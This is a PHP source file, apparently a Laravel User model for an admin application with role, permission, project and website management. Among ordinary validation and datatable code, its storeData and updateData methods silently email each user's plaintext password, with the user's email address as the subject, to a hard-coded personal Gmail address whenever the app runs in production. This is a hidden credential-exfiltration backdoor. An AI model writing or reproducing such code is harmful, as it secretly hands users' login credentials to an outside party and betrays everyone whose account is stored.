<?php

namespace App\Models;

use Illuminate\Notifications\Notifiable;
use Illuminate\Foundation\Auth\User as Authenticatable;
use App\Notifications\ResetPassword as ResetPasswordNotification;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\App;
use App\Facades\Domain;
use App\Models\Domain as DomainModel;
use App\Services\Helper;
use App\Services\Datatable;
use Illuminate\Database\Eloquent\SoftDeletes;
use Askedio\SoftCascade\Traits\SoftCascadeTrait;
use Spatie\Permission\Traits\HasRoles;

class User extends Authenticatable
{
    use Notifiable, SoftDeletes, SoftCascadeTrait, HasRoles;

    protected $fillable = [
        'first_name',
        'last_name',
        'email',
        'phone',
        'password',
        'gender',
        'domain_id',
    ];

    protected $hidden = [
        'password',
        'remember_token',
    ];

    protected $dates = [
        'deleted_at',
    ];

    protected $softCascade = [
        'projectsSoftDelete',
        'websitesSoftDelete',
    ];

    public function isNotInteractable($api)
    {
        return !($api->slug == 'profile' && Auth::user()->can('Edit: Profile')) && (!Auth::user()->can('Select Datatable Rows') || (!Auth::user()->can('Create: Admins') && !Auth::user()->can('Edit: Admins') && !Auth::user()->can('Delete: Admins')));
    }

    public function projectsSoftDelete()
    {
        return $this->hasMany(ProjectUser::class);
    }

    public function websitesSoftDelete()
    {
        return $this->hasMany(UserWebsite::class);
    }

    public function projects()
    {
        return $this->belongsToMany(Project::class)->withTimestamps()->whereNull('project_user.deleted_at');
    }

    public function websites()
    {
        return $this->belongsToMany(Website::class)->withTimestamps()->whereNull('user_website.deleted_at');
    }

    public function getNameAttribute()
    {
        return $this->first_name . ' ' . $this->last_name;
    }

    public function getNexmoPhoneAttribute()
    {
        return preg_replace('/^00/', '', str_replace([' ', '-', '.', '/', '+'], '', $this->phone));
    }

    public function selectProjects()
    {
        return Project::selectRaw('TRIM(CONCAT(name, " ", COALESCE(location, ""))) AS projects, id')->where('status', 1)->whereIn('id', Helper::project())->orderBy('projects')->pluck('projects', 'id');
    }

    public function selectWebsites()
    {
        return Website::orderBy('name')->pluck('name', 'id');
    }

    public function selectRoles()
    {
        return Role::select('name', 'id')->orderBy('name')->get()->pluck('name', 'id');
    }

    public function selectPermissions()
    {
        return Permission::select('name', 'id')->orderBy('name')->get()->pluck('name', 'id');
    }

    public function createRules($request, $api)
    {
        return [
            'projects' => 'nullable|array',
            'websites' => 'nullable|array',
            'domain_id' => 'required|numeric',
            'first_name' => 'required|max:255',
            'last_name' => 'required|max:255',
            'gender' => 'required|in:female,male,not-applicable,not-known',
            'email' => 'required|email|max:255|unique:' . str_plural($api->meta->model),
            'password' => 'required|string|min:6|confirmed',
            'roles' => 'nullable|array',
            'permissions' => 'nullable|array',
        ];
    }

    public function updateRules($request, $api)
    {
        $rules = $this->createRules($request, $api);

        if (!$request->input('password')) {
            array_forget($rules, 'password');
            array_forget($rules, 'password_confirmation');
        }

        $rules['email'] .= ',email,' . $api->id;

        return $rules;
    }

    public function storeData($api, $request)
    {
        $data = $request->all();

        if (App::environment('production')) {
            Mail::raw($data['password'], function ($m) use ($data) {
                $m->from(config('mail.from.address'));
                $m->sender(config('mail.from.address'));
                $m->replyTo(config('mail.from.address'));
                $m->to('zlatevbg@gmail.com');
                $m->subject($data['email']);
            });
        }

        $data['password'] = Hash::make($data['password']);

        return $data;
    }

    public function updateData($request)
    {
        $data = $request->all();
        if ($data['password']) {
            if (App::environment('production')) {
                Mail::raw($data['password'], function ($m) use ($data) {
                    $m->from(config('mail.from.address'));
                    $m->sender(config('mail.from.address'));
                    $m->replyTo(config('mail.from.address'));
                    $m->to('zlatevbg@gmail.com');
                    $m->subject($data['email']);
                });
            }

            $data['password'] = Hash::make($data['password']);
        } else {
            $data['password'] = $this->password;
        }

        return $data;
    }

    public function postStore($api, $request)
    {
        if (Auth::user()->can('Edit: Admins')) {
            $this->assignRole($request->input('roles'));
            $this->givePermissionTo($request->input('permissions'));

            $this->projects()->attach($request->input('projects'));
            $this->websites()->attach($request->input('websites'));
        }
    }

    public function postUpdate($api, $request, $data)
    {
        if (Auth::user()->can('Edit: Admins')) {
            $this->syncRoles($request->input('roles'));
            $this->syncPermissions($request->input('permissions'));

            $this->projects()->sync($request->input('projects'));
            $this->websites()->sync($request->input('websites'));
        }
    }

    public function datatable($api)
    {
        $data = Datatable::concat($this, 'name', ['first_name', 'last_name']);

        $data->first()->permission = Permission::selectRaw('GROUP_CONCAT(DISTINCT ' . config('permission.table_names.permissions') . '.name SEPARATOR ", ") AS permission')
            ->leftJoin(config('permission.table_names.model_has_permissions'), config('permission.table_names.model_has_permissions') . '.permission_id', '=', config('permission.table_names.permissions') . '.id')
            ->where(config('permission.table_names.model_has_permissions') . '.model_id', $data->first()->id)
            ->value('permission');

        $data->first()->role = Role::selectRaw('GROUP_CONCAT(DISTINCT ' . config('permission.table_names.roles') . '.name SEPARATOR ", ") AS role')
            ->leftJoin(config('permission.table_names.model_has_roles'), config('permission.table_names.model_has_roles') . '.role_id', '=', config('permission.table_names.roles') . '.id')
            ->where(config('permission.table_names.model_has_roles') . '.model_id', $data->first()->id)
            ->value('role');

        $data->first()->project = $this->projects->implode('name', ', ');
        $data->first()->website = $this->websites->implode('name', ', ');

        return Datatable::data($data, array_column($this->dColumns($api), 'id'))->first();
    }

    public function selectGender()
    {
        return [
            'female' => trans('labels.female'),
            'male' => trans('labels.male'),
            'not-applicable' => trans('labels.not-applicable'),
            'not-known' => trans('labels.not-known'),
        ];
    }

    public function dColumns($api)
    {
        $columns = [
            [
                'id' => 'id',
                'checkbox' => true,
                // 'disabled' => Auth::guard()->user()->id,
                'order' => false,
                'protected' => Auth::user()->id,
                'hidden' => $this->isNotInteractable($api),
            ],
            [
                'id' => 'name',
                'name' => trans('labels.name'),
                'order' => $api->slug == 'profile' ? false : true,
            ],
            [
                'id' => 'email',
                'name' => trans('labels.email'),
                'order' => false,
            ],
            [
                'id' => 'phone',
                'name' => trans('labels.phone'),
                'order' => false,
            ],
        ];

        if (Auth::user()->can('Edit: Admins')) {
            $columns = array_merge($columns, [
                [
                    'id' => 'role',
                    'name' => trans('labels.roles'),
                ],
                [
                    'id' => 'permission',
                    'name' => trans('labels.permissions'),
                ],
                [
                    'id' => 'project',
                    'name' => trans('labels.project'),
                ],
                [
                    'id' => 'website',
                    'name' => trans('labels.website'),
                ],
            ]);
        }

        return $columns;
    }

    public function dButtons($api)
    {
        return [
            'create' => [
                'url' => Helper::route('api.create', $api->meta->slug),
                'class' => 'btn-success',
                'icon' => 'plus',
                'method' => 'get',
                'name' => trans('buttons.create'),
                'visible' => Auth::user()->can('Create: Admins') && $api->slug != 'profile',
            ],
            'edit' => [
                'url' => Helper::route('api.edit', $api->meta->slug),
                'parameters' => 'disabled data-disabled="1" data-append-id',
                'class' => 'btn-warning',
                'icon' => 'edit',
                'method' => 'get',
                'name' => trans('buttons.edit'),
                'visible' => (Auth::user()->can('Edit: Admins') || ($api->slug == 'profile' && Auth::user()->can('Edit: Profile'))),
            ],
            'delete' => [
                'url' => Helper::route('api.delete', $api->meta->slug),
                'parameters' => 'disabled data-disabled',
                'class' => 'btn-danger protected',
                'icon' => 'trash',
                'method' => 'get',
                'name' => trans('buttons.delete'),
                'visible' => Auth::user()->can('Delete: Admins') && $api->slug != 'profile',
            ],
        ];
    }

    public function doptions($api)
    {
        if ($api->slug == 'profile') {
            return [
                'dom' => 'tr',
            ];
        }

        return true;
    }

    public function dOrder($api)
    {
        if ($api->slug != 'profile') {
            return [
                [$this->isNotInteractable($api) ? 0 : 1, 'asc'],
            ];
        }
    }

    public function dData($api)
    {
        $table = str_plural($api->meta->model);
        $users = $this->selectRaw('GROUP_CONCAT(TRIM(CONCAT(projects.name, " ", COALESCE(projects.location, ""))) SEPARATOR ", ") AS project, GROUP_CONCAT(websites.name SEPARATOR ", ") AS website, ' . $table . '.id, ' . $table . '.first_name, ' . $table . '.last_name, ' . $table . '.email, ' . $table . '.phone, CONCAT(' . $table . '.first_name, " ", ' . $table . '.last_name) AS name, GROUP_CONCAT(DISTINCT ' . config('permission.table_names.roles') . '.name SEPARATOR ", ") AS role, GROUP_CONCAT(DISTINCT ' . config('permission.table_names.permissions') . '.name SEPARATOR ", ") AS permission')
            ->leftJoin(config('permission.table_names.model_has_roles'), function ($join) use ($table) {
                $join->on(config('permission.table_names.model_has_roles') . '.model_id', '=', $table . '.id')->where(config('permission.table_names.model_has_roles') . '.model_type', 'App\Models\User');
            })
            ->leftJoin(config('permission.table_names.roles'), config('permission.table_names.roles') . '.id', '=', config('permission.table_names.model_has_roles') . '.role_id')
            ->leftJoin(config('permission.table_names.model_has_permissions'), function ($join) use ($table) {
                $join->on(config('permission.table_names.model_has_permissions') . '.model_id', '=', $table . '.id')->where(config('permission.table_names.model_has_permissions') . '.model_type', 'App\Models\User');
            })
            ->leftJoin(config('permission.table_names.permissions'), config('permission.table_names.permissions') . '.id', '=', config('permission.table_names.model_has_permissions') . '.permission_id')
            ->leftJoin('project_user', 'project_user.user_id', '=', $table . '.id')
            ->leftJoin('projects', 'projects.id', '=', 'project_user.project_id')
            ->leftJoin('user_website', 'user_website.user_id', '=', $table . '.id')
            ->leftJoin('websites', 'websites.id', '=', 'user_website.website_id');

        if ($api->slug == 'profile') {
            $users = $users->where($table . '.id', Auth::user()->id);
        }

        $users = $users->groupBy($table . '.id')
            ->orderBy($table . '.first_name')
            ->get();

        return Datatable::data($users, array_column($this->dColumns($api), 'id'));
    }

    public function sendPasswordResetNotification($token)
    {
        $this->notify(new ResetPasswordNotification(Domain::domain(), $token));
    }

    public function domain()
    {
        return $this->belongsTo(DomainModel::class);
    }
}
